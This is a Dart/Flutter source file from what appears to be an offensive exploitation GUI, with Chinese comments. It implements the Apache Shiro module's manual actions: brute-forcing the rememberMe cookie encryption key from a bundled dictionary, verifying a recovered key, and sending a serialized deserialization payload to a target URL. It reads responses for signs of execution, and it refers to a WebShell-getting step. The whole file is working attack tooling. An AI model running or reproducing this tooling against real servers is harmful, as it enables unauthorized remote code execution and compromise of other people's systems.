import 'dart:convert';

import 'package:flutter/material.dart';

import '../../exp/core/exploit_session.dart';
import '../../exp/core/log_line.dart';
import '../../exp/shiro/shiro_crypto.dart';
import '../../exp/shiro/shiro_exp_service.dart';
import '../../exp/shiro/shiro_payload_repo.dart';
import '../../exp/specs/shiro_spec.dart';
import '../../exp/ui/exp_module_page.dart';
import '../../exp/ui/exp_tokens.dart';
import '../../theme/app_theme.dart';

/// Shiro 家族页。
///
/// 迁移前的 `shiro_exp.dart` 有 5 个动作，其中「爆破 Key / 验证 Key / 发送 Payload」
/// 不属于 check/exec/getShell 三类能力，因此放在逃生舱里单独提供；
/// 其余参数全部走 spec 字段，模块层直接消费。
class ShiroPage extends StatelessWidget {
  const ShiroPage({super.key, this.initialTargetUrl});

  final String? initialTargetUrl;

  @override
  Widget build(BuildContext context) => ExpModulePage(
    spec: shiroSpec,
    initialUrl: initialTargetUrl,
    extraPanelBuilder: (context, session) =>
        _ShiroExtraActions(session: session),
  );
}

class _ShiroExtraActions extends StatelessWidget {
  const _ShiroExtraActions({required this.session});

  final ExploitSessionController session;

  ShiroExpService _service() {
    final method = (session.field('method') ?? 'GET').toUpperCase();
    final cookieName = (session.field('cookieName') ?? '').trim();
    return ShiroExpService(
      url: session.url,
      method: method.isEmpty ? 'GET' : method,
      cookieName: cookieName.isEmpty ? 'rememberMe' : cookieName,
      timeout: Duration(seconds: session.timeoutSeconds),
    );
  }

  ShiroEncryptionMode _mode() =>
      (session.field('mode') ?? 'cbc') == 'gcm'
          ? ShiroEncryptionMode.gcm
          : ShiroEncryptionMode.cbc;

  Future<List<int>> _payload() async {
    final custom = (session.field('payload') ?? '').trim();
    if (custom.isNotEmpty) {
      return base64Decode(custom.replaceAll(RegExp(r'\s'), ''));
    }
    return const ShiroPayloadRepo().loadPayload('shiro_payload_principal.b64');
  }

  void _log(String line) => session.logRaw(line);

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Container(
          padding: ExpSpace.control,
          decoration: BoxDecoration(
            color: ExpColors.fill(ExpColors.info, 0.08),
            borderRadius: ExpRadius.controlBorder,
            border: Border.all(color: ExpColors.fill(ExpColors.info, 0.35)),
          ),
          child: Text(
            '手动动作：与「检测 / 获取 WebShell」共用上面填写的参数。'
            '爆破出的 key 会写回「rememberMe key」字段，后续动作直接复用。',
            style: AppTextStyles.caption(
              size: ExpText.caption,
              color: ExpColors.textSecondary,
            ),
          ),
        ),
        ExpSpace.vMd,
        Wrap(
          spacing: ExpSpace.sm,
          runSpacing: ExpSpace.sm,
          children: [
            OutlinedButton(
              onPressed: session.running ? null : _bruteforce,
              style: ExpButton.secondary(),
              child: const Text('爆破 Key'),
            ),
            OutlinedButton(
              onPressed: session.running ? null : _verify,
              style: ExpButton.secondary(),
              child: const Text('验证 Key'),
            ),
            OutlinedButton(
              onPressed: session.running ? null : _sendPayload,
              style: ExpButton.secondary(),
              child: const Text('发送 Payload'),
            ),
          ],
        ),
      ],
    );
  }

  Future<void> _bruteforce() => session.run(
    label: '爆破 rememberMe key',
    phase: SessionPhase.executing,
    body: () async {
      final repo = const ShiroPayloadRepo();
      final keys = await repo.loadKeys();
      if (keys.isEmpty) {
        _log('[!] 内置字典为空');
        return;
      }
      final payload = await _payload();
      _log('[i] 字典 ${keys.length} 个 key，模式 ${_mode().name.toUpperCase()}');
      final key = await _service().bruteForceKey(
        candidateKeysBase64: keys,
        serializedPayload: payload,
        mode: _mode(),
        verbose: (session.field('verbose') ?? 'false') == 'true',
        onProgress: _log,
      );
      if (key == null) {
        _log('[-] 字典内没有可用 key');
        return;
      }
      session.setField('key', key);
      _log('[+] 命中 key：$key（已写回字段）');
    },
  );

  Future<void> _verify() => session.run(
    label: '验证 key',
    phase: SessionPhase.executing,
    body: () async {
      final key = (session.field('key') ?? '').trim();
      if (key.isEmpty) {
        _log('[!] 请先填写或爆破出 key');
        return;
      }
      final ok = await _service().verifyKey(
        keyBase64: key,
        serializedPayload: await _payload(),
        mode: _mode(),
        onProgress: _log,
      );
      _log(ok ? '[+] key 可伪造 rememberMe' : '[-] key 无效（deleteMe 未下降）');
    },
  );

  Future<void> _sendPayload() => session.run(
    label: '发送自定义 Payload',
    phase: SessionPhase.executing,
    body: () async {
      final key = (session.field('key') ?? '').trim();
      if (key.isEmpty) {
        _log('[!] 请先填写或爆破出 key');
        return;
      }
      final payload = await _payload();
      final result = await _service().sendExploitOnce(
        keyBase64: key,
        serializedPayload: payload,
        mode: _mode(),
        compareWithBaseline: true,
        onProgress: _log,
      );
      _log(
        result.likelySuccess
            ? '[+] Payload 可能已执行（deleteMe 下降）'
            : '[-] Payload 可能未执行（deleteMe 未下降）',
      );
    },
  );
}
